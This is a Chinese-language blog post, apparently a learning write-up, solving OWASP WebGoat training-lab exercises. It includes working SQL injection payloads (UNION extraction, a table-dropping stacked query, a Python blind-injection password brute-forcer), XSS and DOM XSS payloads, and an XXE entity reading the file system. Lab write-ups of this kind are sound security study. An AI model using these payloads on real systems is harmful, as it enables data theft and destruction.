@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>web-goat | 灰太狼</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+    <meta name="description" content="我一定会回来的">
+  
+  
+  
+    <link rel="alternate" href="/atom.xml" title="灰太狼" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/localshare/css/share.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">灰太狼</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/."><i class="fa fa-home"></i> 首页</a>
+        
+          <a class="main-nav-link" href="/archives/"><i class="fa fa-archive"></i> 归档</a>
+        
+          <a class="main-nav-link" href="/about/"><i class="fa fa-user"></i> 关于</a>
+        
+          <a class="main-nav-link" href="/atom.xml"><i class="fa fa-rss"></i> 订阅</a>
+        
+      </nav>
+    </div>
+    <div id="search-form">
+      <div id="result-mask" class="hide"></div>
+      <label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label>
+      <div id="result-wrap" class="hide">
+        <div id="search-result"></div>
+      </div>
+      <div class="hide">
+        <template id="search-tpl">
+          <div class="item">
+            <a href="/{path}" title="{title}">
+              <div class="title">{title}</div>
+              <div class="time">{date}</div>
+              <div class="tags">{tags}</div>
+            </a>
+          </div>
+        </template>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-web-goat" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      web-goat
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2023-12-06T05:20:44.000Z" itemprop="datePublished">2023年12月06日</time>
+</span>
+      
+      
+        <span class="article-views">
+  <i class="fa fa-views"></i>
+  <i id="busuanzi_container_page_pv">
+      <i id="busuanzi_value_page_pv"></i>
+  </i>
+</span>
+
+      
+      
+<a href="/2023/12/06/web-goat/#comments" class="article-comment-link">
+  
+    
+    
+    
+    
+    
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Web-Goat搭建"><a href="#Web-Goat搭建" class="headerlink" title="Web-Goat搭建"></a>Web-Goat搭建</h1><ol>
+<li><p>查看java版本</p>
+<p><img src="/2023/12/06/web-goat/image-20231206190637174.png" alt="image-20231206190637174"></p>
+<span id="more"></span>
+</li>
+<li><p>下载webgoat.jar包</p>
+<p><img src="/2023/12/06/web-goat/image-20231206135510344.png" alt="image-20231206135510344"></p>
+</li>
+<li><p>运行webgoat</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar webgoat-server-8.2.2.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/web-goat/image-20231206190652358.png" alt="image-20231206190652358"></p>
+<p>访问本机环回地址80端口：</p>
+<p><img src="/2023/12/06/web-goat/image-20231206190803739.png" alt="image-20231206190803739"></p>
+</li>
+<li><p>注册：</p>
+<p><img src="/2023/12/06/web-goat/image-20231206190858964.png" alt="image-20231206190858964"></p>
+</li>
+<li><p>Injection</p>
+<ul>
+<li><p>sql injection(intro)</p>
+<ol>
+<li><p><img src="/2023/12/06/web-goat/image-20231206192107986.png" alt="image-20231206192107986"></p>
+</li>
+<li><p><img src="/2023/12/06/web-goat/image-20231206192726265.png" alt="image-20231206192726265"></p>
+<p>修改表Employees中department列为Sales，其中first_name&#x3D;’Tobi’</p>
+</li>
+<li><p><img src="/2023/12/06/web-goat/image-20231206193023637.png" alt="image-20231206193023637"></p>
+</li>
+<li><pre><code>grant SELECT, INSERT, UPDATE, DELETE  on grant_rights to unauthorized_user
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ![image-20231206194214506](web-goat/image-20231206194214506.png)</span><br><span class="line"></span><br><span class="line">5. 闭合符号</span><br><span class="line"></span><br><span class="line">   ![image-20231206200840205](web-goat/image-20231206200840205.png)</span><br><span class="line"></span><br><span class="line">6. ![image-20231206200852794](web-goat/image-20231206200852794.png)</span><br><span class="line"></span><br><span class="line">7. ![image-20231206201216892](web-goat/image-20231206201216892.png)</span><br><span class="line"></span><br><span class="line">8. ```</span><br><span class="line">   UPDATE employees SET SALARY = 999999 WHERE LAST_NAME = &#x27;Smith&#x27;</span><br><span class="line">   这是修改的sql语句，</span><br><span class="line">   1&#x27;; UPDATE employees SET SALARY = 999999 WHERE LAST_NAME = &#x27;Smith&#x27;; --</span><br></pre></td></tr></table></figure>
+
+![image-20231206201654163](web-goat/image-20231206201654163.png)
+</code></pre>
+</li>
+<li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">删除日志：DROP TABLE access_log</span><br><span class="line">注入恶意代码：1&#x27;;DROP TABLE access_log;--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/web-goat/image-20231206202001550.png" alt="image-20231206202001550"></p>
+</li>
+</ol>
+</li>
+<li><p>advanced</p>
+<ol>
+<li><pre><code>这页已知Name框有SQL注入漏洞，要求得到user_system_data整表数据。Password框在注入的时候没用，就是用来检测注入得到的Dave的密码对不对的。
+Dave&#39; union select userid,user_name,password,cookie,&#39;5&#39;,&#39;6&#39;,7 from user_system_data-- ss
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ![image-20231207151448599](web-goat/image-20231207151448599.png)</span><br><span class="line"></span><br><span class="line">   表中有七列，联合查询占位七位</span><br><span class="line"></span><br><span class="line">   ![image-20231207151341285](web-goat/image-20231207151341285.png)</span><br><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   import requests</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">   url = &quot;http://192.168.101.16:8222/WebGoat/SqlInjectionAdvanced/challenge&quot;</span><br><span class="line">   headers=&#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&quot;,&quot;Cookie&quot;: &quot;JSESSIONID=VjGdZj9IvzWQ9BJFIEar2--CEun-GVI0GnBVU7nE&quot;,&#125;</span><br><span class="line">    </span><br><span class="line">   keylist = [chr(i) for i in range(33, 127)]                                     #包括数字、大小写字母、特殊字符</span><br><span class="line">   answer = &#x27;&#x27;</span><br><span class="line">    </span><br><span class="line">   for i in range(1,24):</span><br><span class="line">       for c in keylist:</span><br><span class="line">           payload = &quot;tom&#x27; and substring(password,&quot;+str(i)+&quot;,1)=&#x27;&quot;+c+&quot;&#x27;-- ss&quot;     #用substring逐位猜测密码</span><br><span class="line">           formdata = &#123;</span><br><span class="line">           &quot;username_reg&quot;:payload,</span><br><span class="line">           &quot;email_reg&quot;:&quot;123@123.com&quot;,</span><br><span class="line">           &quot;password_reg&quot;:&quot;12&quot;,</span><br><span class="line">           &quot;confirm_password_reg&quot;:&quot;12&quot;,</span><br><span class="line">           &#125;</span><br><span class="line">           response = requests.put(url, data = formdata, headers = headers)</span><br><span class="line">           if response.text.find(&quot;already exists&quot;) != -1:                         #猜对了的话返回结果会包含already exists</span><br><span class="line">               answer = answer+c</span><br><span class="line">               break</span><br><span class="line">   print(answer)                                                                  #打印结果     </span><br></pre></td></tr></table></figure>
+
+bp抓包之后，使用脚本跑密码
+
+得出结果：thisisasecretfortomonly
+
+尝试登陆：
+
+![image-20231207152551250](web-goat/image-20231207152551250.png)
+</code></pre>
+</li>
+<li><p><img src="/2023/12/06/web-goat/image-20231207153227834.png" alt="image-20231207153227834"></p>
+</li>
+</ol>
+</li>
+<li><p>mitigation</p>
+<ol>
+<li><p>这一页就是照葫芦画瓢，根据第3和第4页来完成一段没有SQL注入漏洞的代码。</p>
+<p>按照下图填写就行了，先连接数据库，然后定义预编译语句，再用输入的参数替换placeholder。</p>
+<p><img src="/2023/12/06/web-goat/image-20231207153815068.png" alt="image-20231207153815068"></p>
+<p><img src="/2023/12/06/web-goat/image-20231207153826090.png" alt="image-20231207153826090"></p>
+</li>
+<li><pre><code>String userName = &quot;lily&quot;;
+try &#123;
+    Connection conn = DriverManager.getConnection(DBURL,DBUSER,DBPW);
+    PreparedStatement ps = conn.prepareStatement(&quot;SELECT * FROM users WHERE name = ?&quot;);
+    ps.setString(1, userName);
+    ResultSet results = ps.executeQuery();
+    System.out.println(results.next());
+&#125; catch (Exception e) &#123;
+    System.out.println(&quot;Oops. Something went wrong!&quot;);
+&#125;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ![image-20231207154430541](web-goat/image-20231207154430541.png)</span><br><span class="line"></span><br><span class="line">   ![image-20231207154452026](web-goat/image-20231207154452026.png)</span><br><span class="line"></span><br><span class="line">3. ```</span><br><span class="line">   Dave&#x27; union select userid,user_name,password,cookie,&#x27;5&#x27;,&#x27;6&#x27;,7 from user_system_data-- ss或者1&#x27;;select * from user_system_data-- ss</span><br><span class="line">   这一题和上面的有些相似，使用相同代码之后发现不能使用空格，也就是空格绕过</span><br><span class="line">   使用/**/代替空格，构造payload：</span><br><span class="line">   1&#x27;;select/**/*/**/from/**/user_system_data--/**/ss</span><br><span class="line">   </span><br></pre></td></tr></table></figure>
+
+![image-20231207154606003](web-goat/image-20231207154606003.png)
+</code></pre>
+</li>
+<li><pre><code>1&#39;;select	*	from	user_system_data--	ss
+1&#39;;select	*	from	user_system_data--	ss
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">        ![image-20231207155220210](web-goat/image-20231207155220210.png)</span><br><span class="line"></span><br><span class="line">        这题把在burp中爆破成功的两个空白字符payload直接拿到浏览器去提交是会报错的：</span><br><span class="line"></span><br><span class="line">        比如1&#x27;%3Bselect%0c*%0cfrom%0cuser_system_data--%0css</span><br><span class="line"></span><br><span class="line">        抓包发现payload中百分号被编码了</span><br><span class="line"></span><br><span class="line">        ![image-20231207155252948](web-goat/image-20231207155252948.png)</span><br><span class="line"></span><br><span class="line">        构造payload：</span><br><span class="line"></span><br><span class="line">        payload为：1&#x27;;select   *   from   user_system_data--   ss</span><br><span class="line"></span><br><span class="line">        ![image-20231207155427176](web-goat/image-20231207155427176.png)</span><br><span class="line"></span><br><span class="line">     5. 抓包分别得出列名：</span><br><span class="line"></span><br><span class="line">        第一列：</span><br><span class="line"></span><br><span class="line">        ![image-20231207155859711](web-goat/image-20231207155859711.png)</span><br><span class="line"></span><br><span class="line">        第二列：</span><br><span class="line"></span><br><span class="line">        ![image-20231207155914584](web-goat/image-20231207155914584.png)</span><br><span class="line"></span><br><span class="line">        下面以第1位数字举例，其他两位类似：</span><br><span class="line"></span><br><span class="line">        ![image-20231207160057706](web-goat/image-20231207160057706.png)</span><br><span class="line"></span><br><span class="line">        全部3位爆破完成后发现是104，完整的ip地址是104.130.219.202，填入输入框，提交后即可通过。</span><br><span class="line"></span><br><span class="line">        ![image-20231207160131304](web-goat/image-20231207160131304.png)</span><br><span class="line"></span><br><span class="line">6. XSS</span><br><span class="line"></span><br><span class="line">   1. ![image-20231207172322572](web-goat/image-20231207172322572.png)</span><br><span class="line"></span><br><span class="line">      直接输入yes</span><br><span class="line"></span><br><span class="line">      ![image-20231207172354811](web-goat/image-20231207172354811.png)</span><br><span class="line"></span><br><span class="line">   2. 这一页要求用alert()或者console.log()来试哪里有XSS</span><br><span class="line"></span><br><span class="line">      由于XSS最终是要浏览器渲染的，因此，可以先按下Purchase，看看哪个输入是会回显的</span><br><span class="line"></span><br><span class="line">      ![image-20231207172523259](web-goat/image-20231207172523259.png)</span><br><span class="line"></span><br><span class="line">      从上图可知，信用卡这里输入框的输入参数是会回显的</span><br><span class="line"></span><br><span class="line">      在这个输入框中尝试输入</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+ &lt;script&gt;alert(&#39;I win this game&#39;)&lt;/script&gt;
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ![image-20231207172634364](web-goat/image-20231207172634364.png)</span><br><span class="line"></span><br><span class="line">   回显成功。</span><br><span class="line"></span><br><span class="line">3. 这页要求找测试用的路径，并提示需要在JavaScript代码中寻找。</span><br><span class="line"></span><br><span class="line">   在GoatRouter.js中搜一下testRoute在哪里，发现testRoute把param参数扔到lessonController的testHandler()里面去了</span><br><span class="line"></span><br><span class="line">   ![image-20231207173012640](web-goat/image-20231207173012640.png)</span><br><span class="line"></span><br><span class="line">   回显成功。</span><br><span class="line"></span><br><span class="line">4. 这一页要求用上一页找到的路径实施DOM XSS攻击，在浏览器的console中获取到一串随机数</span><br><span class="line"></span><br><span class="line">   有了上一页的铺垫，这里直接构造payload：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+ start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome()%3C%2fscript%3E
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">      ![image-20231207173207183](web-goat/image-20231207173207183.png)</span><br><span class="line"></span><br><span class="line">   5. 43124</span><br><span class="line"></span><br><span class="line">      ![image-20231207173248144](web-goat/image-20231207173248144.png)</span><br><span class="line"></span><br><span class="line">7. XML</span><br><span class="line"></span><br><span class="line">   1. 这题要求用XXE注入罗列系统根目录。</span><br><span class="line"></span><br><span class="line">      首先在上图的输入框输入个评论，比如cute，按[submit](https://so.csdn.net/so/search?q=submit&amp;spm=1001.2101.3001.7020)提交。</span><br><span class="line"></span><br><span class="line">      到burpsuite的proxy模块找到相关request报文，鼠标右键--send to repeater</span><br><span class="line"></span><br><span class="line">      ![image-20231207173428369](web-goat/image-20231207173428369.png)</span><br><span class="line"></span><br><span class="line">      在request报文中的xml代码中增加DTD，并在其中定义外部实体root，其内容是&quot;file:///&quot;，然后记得引用外部实体（&amp;root;）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+ &lt;?xml version=&quot;1.0&quot;?&gt;
+ &lt;!DOCTYPE cat [
+&lt;!ENTITY root SYSTEM &quot;file:///&quot;&gt;
+ ]&gt;
+ &lt;comment&gt;  &lt;text&gt;&amp;root;&lt;/text&gt;&lt;/comment&gt;
+</code></pre>
+</li>
+</ol>
+<pre><code>
+![image-20231207173559577](web-goat/image-20231207173559577.png)
+</code></pre>
+</li>
+</ul>
+<ol start="2">
+<li><p>这题提醒REST框架中服务器可能会接收开发者想不到的格式的数据</p>
+<p>burpsuite的proxy模块中可以抓到这样一个发送评论内容的包，Content-Type头是application&#x2F;json，POST数据是json格式的。把这个包send to repeater。</p>
+<p><img src="/2023/12/06/web-goat/image-20231207173642433.png" alt="image-20231207173642433"></p>
+<p>在repeater中需要做两件事：</p>
+<p>1、把第4页的payload拷贝到POST数据部分，替换掉原来json格式的数据</p>
+<p>2、把Content-Type头的内容改成application&#x2F;xml</p>
+<p>轻松过关~</p>
+<p><img src="/2023/12/06/web-goat/image-20231207173705718.png" alt="image-20231207173705718"></p>
+</li>
+</ol>
+</li>
+<li><p>Sensitive Date</p>
+<p>点击Login就会发送一个数据包，我们用Burp<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">抓包</a>直接拿到答案：</p>
+<p><img src="/2023/12/06/web-goat/image-20231207174322227.png" alt="image-20231207174322227"></p>
+<p><img src="/2023/12/06/web-goat/image-20231207174340720.png" alt="image-20231207174340720"></p>
+<p>用户名: CaptainJack</p>
+<p>密码：BlackPearl</p>
+</li>
+</ol>
+
+        
+            <div id="toc-article">
+                
+  <div class="widget-wrap" id="toc-wrap">
+    <h3 class="widget-title"><i class="fa fa-toc"></i> 文章目录</h3>
+    <div class="widget">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Goat%E6%90%AD%E5%BB%BA"><span class="toc-text">Web-Goat搭建</span></a></li></ol>
+    </div>
+  </div>
+
+
+            </div>
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="http://example.com/2023/12/06/web-goat/">http://example.com/2023/12/06/web-goat/</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+          
+    <div class="social-share">
+      <span>分享到:</span>
+    </div>
+
+
+
+        </div>
+      
+      
+        
+<nav id="article-nav">
+  
+    <a href="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">older</strong>
+      <div class="article-nav-title">
+        
+          CTF成长记录
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/12/26/catharsis/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">newer</strong>
+      <div class="article-nav-title">
+        
+          catharsis
+        
+      </div>
+    </a>
+  
+</nav>
+
+      
+      
+        
+
+
+
+
+
+
+
+
+      
+    </footer>
+  </div>
+</article>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-posts"></i> 最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/12/26/catharsis/">catharsis</a>
+          </li>
+        
+          <li>
+            <a href="/2023/12/06/web-goat/">web-goat</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/">CTF成长记录</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/17/XXE/">XXE</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/16/Hacker-Kid/">Hacker Kid</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+    
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-archive"></i> 归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023年</a><span class="archive-list-count">8</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-link"></i> 友情链接</h3>
+    <div class="widget">
+      <ul>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example1.com/">site-name1</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example2.com/">site-name2</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example3.com/">site-name3</a>
+        </li>
+      
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+        
+      </div>
+      <a id="totop" href="#top"></a>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <p>
+        <a href="/sitemap.xml">网站地图</a>
+        <span> | </span><a href="/atom.xml">订阅本站</a>
+        <span> | </span><a href="/about/">联系博主</a>
+      </p>
+      
+        <p>
+          <i class="fa fa-visitors"></i>
+          <i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>
+          ，
+          <i class="fa fa-views"></i>
+          <i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>
+        </p>
+      
+      <p>
+        <span>Copyright &copy; 2023 bigbigwolf.</span>
+        <span>Theme by <a href="https://github.com/chaooo/hexo-theme-BlueLake/" target="_blank">BlueLake.</a></span>
+        <span>Powered by <a href="https://hexo.io/" target="_blank">Hexo.</a></span>
+      </p>
+    </div>
+  </div>
+</footer>
+
+    </div>
+  </div>
+  
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+<script src="/js/search.json.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+  
+<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+    
+<script src="/localshare/js/social-share.js"></script>
+
+    
+<script src="/localshare/js/qrcode.js"></script>
+
+  
+  
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+
+
+
+
+</body>
+</html>
